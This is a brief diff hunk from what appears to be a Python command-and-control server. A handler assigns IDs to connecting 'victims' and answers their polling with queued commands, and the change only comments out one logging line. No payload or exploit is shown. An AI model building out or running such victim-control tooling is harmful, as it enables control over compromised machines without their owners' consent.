@@ -45,7 +45,7 @@ class CMDProtoHandler(asyncore.dispatcher_with_send):
 				self.server.log("Victim reconnected : " + vic.VIC_ID, 2)
 			self.send("SET ID " + vic.VIC_ID + "\n")
 		elif parts[0]=="POLL":
-			self.server.log("POLLING request from " + parts[1], 1)
+			#self.server.log("POLLING request from " + parts[1], 1)
 			test = self.getVicTest(request)
 			self.send(test + "\n")
 			#client waits for new command
